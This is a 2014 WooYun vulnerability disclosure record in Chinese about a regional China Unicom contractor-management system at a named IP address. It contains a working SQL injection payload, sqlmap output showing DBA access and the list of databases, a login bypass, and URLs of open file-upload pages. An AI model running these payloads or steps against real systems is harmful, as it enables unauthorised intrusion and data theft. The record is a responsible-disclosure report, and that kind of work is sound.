{"id": 55007, "wybug_id": "wooyun-2014-062450", "wybug_title": "某地联通代维管理系统各种漏洞", "wybug_corp": "某地联通代维管理系统", "wybug_author": "路人甲", "wybug_date": "2014-05-27 10:03", "wybug_open_date": "2014-07-11 10:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "注入漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向公众公开  简要描述： 某地联通代维管理系统存在SQL注入漏洞，可以绕过登陆界面，泄露敏感信息，存在可上传文件页面等问题 详细说明：  http://60.22.23.103:9999\n\n存在各种问题\n\n一、存在SQL注入。这个……不太懂，没有进一步测试。http://60.22.23.103:9999/ChangePassword.aspx\nPOST /ChangePassword.aspx HTTP/1.1Host: 60.22.23.103:9999User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://60.22.23.103:9999/ChangePassword.aspxCookie: ASP.NET_SessionId=gh0zbu3ntamjgeaijykdt055Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 308__VIEWSTATE=%2FwEPDwUJMTY2MTUwOTM5ZGSqZjcW6DO9fu2I6%2F4YC%2FxF2ir%2F9Q%3D%3D&ChangePassword1%3AtbUserName=test&ChangePassword1%3AtbPsw=test&ChangePassword1%3AtbNewPsw=test&ChangePassword1%3AbtOk=%C8%B7%B6%A8&__EVENTVALIDATION=%2FwEWBQLPy%2FmoDgKMjLuaBwLv3%2F3MCQK%2B37SoAwL49IjJA99RVzwt4XjRNvM3PYTy%2BB4qCwNu\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: ChangePassword1:tbUserName    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwUJMTY2MTUwOTM5ZGSqZjcW6DO9fu2I6/4YC/xF2ir/9Q==&ChangePassword1:tbUserName=test' AND 7928=CONVERT(INT,(SELECT CHAR(113)+CHAR(109)+CHAR(114)+CHAR(100)+CHAR(113)+(SELECT (CASE WHEN (7928=7928) THEN CHAR(49) ELSECHAR(48) END))+CHAR(113)+CHAR(100)+CHAR(111)+CHAR(113)+CHAR(113))) AND 'zJKt'='zJKt&ChangePassword1:tbPsw=test&ChangePassword1:tbNewPsw=test&ChangePassword1:btOk=%C8%B7%B6%A8&__EVENTVALIDATION=/wEWBQLPy/moDgKMjLuaBwLv3/3MCQK+37SoAwL49IjJA99RVzwt4XjRNvM3PYTy+B4qCwNu---[00:23:21] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[00:23:21] [INFO] fetching current database[00:23:21] [INFO] resumed: ywwzcurrent database:    'ywwz'[00:23:21] [INFO] testing if current user is DBAcurrent user is DBA:    True[00:23:21] [INFO] fetching database users[00:23:21] [INFO] the SQL query used returns 1 entries[00:23:21] [INFO] resumed: sadatabase management system users [1]:[*] sa[00:23:21] [INFO] fetching database names[00:23:21] [INFO] the SQL query used returns 9 entries[00:23:22] [INFO] retrieved: gzjcy[00:23:22] [INFO] retrieved: master[00:23:22] [INFO] retrieved: model[00:23:22] [INFO] retrieved: msdb[00:23:23] [INFO] retrieved: tempdb[00:23:23] [INFO] retrieved: ykltzcgl[00:23:23] [INFO] retrieved: yksq[00:23:24] [INFO] retrieved: ywwz[00:23:24] [INFO] retrieved: zhudiwang_shineiavailable databases [9]:[*] gzjcy[*] master[*] model[*] msdb[*] tempdb[*] ykltzcgl[*] yksq[*] ywwz[*] zhudiwang_shinei[00:23:24] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 10 times[00:23:24] [INFO] fetched data logged to text files under 'C:\\Python27\\sqlmap\\output\\60.22.23.103'[*] shutting down at 00:23:24\n二、可以绕过登陆界面看到“代维管理系统”首页，可以正常显示系统首页信息，而且有敏感信息泄露。http://60.22.23.103:9999/shouye.aspx\n\n\n\n主页上“使用帮助”中有默认登陆账号和密码。我登陆时显示“您无权登陆此系统。”，也许是因为我的不是联通宽带，也许密码已经改了。没验证。\n\n三、存在文件上传页面，可以正常上传文件（绝没上传木马）http://60.22.23.103:9999/baobiaoshangchuan.aspxhttp://60.22.23.103:9999/downloadupload.aspxhttp://60.22.23.103:9999/GongGaoLanLuRu.aspxhttp://60.22.23.103:9999/luodigongdan.aspxhttp://60.22.23.103:9999/shichangfenxi.aspxhttp://60.22.23.103:9999/wangyunfenxi.aspx四、在页面http://60.22.23.103:9999/GongGaoLanLuRu.aspx上传txt文件后直接跳到“信息发布系统”界面，显示以前发布信息，其中有各个单位的账号和默认密码。\n\n   漏洞证明：  同上   修复方案：  1、请尽快修复漏洞2、请不要把账号密码等敏感信息发布到互联网上3、其他的你们比我懂   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-05-30 17:47 厂商回复： CNVD确认并复现所述情况，转由CNCERT下发辽宁分中心通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}